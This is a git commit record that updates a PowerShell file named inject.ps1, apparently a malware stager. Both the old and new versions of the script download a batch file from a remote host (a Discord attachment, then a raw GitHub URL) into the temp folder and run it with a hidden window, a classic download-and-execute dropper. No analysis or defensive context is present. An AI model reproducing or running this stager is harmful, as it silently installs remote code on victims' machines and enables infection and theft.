57095704b01038ed1332b166bb6ed4625a7062a2
Fascicule <87366355+Dazd-Pkz@users.noreply.github.com>
2023-02-23 15:47:21 +0100

    Update inject.ps1

--- inject.ps1
+++ inject.ps1
@@ -1,2 +1,2 @@
-iwr -useb https://cdn.discordapp.com/attachments/1074713687778152552/1077678128673079366/impostah.bat -o $env:TEMP\injector.bat
+iwr -useb https://raw.githubusercontent.com/Dazd-Pkz/shit-stuff/main/ryu.bat -o $env:TEMP\injector.bat
 saps $env:TEMP\injector.bat -WindowStyle Hidden
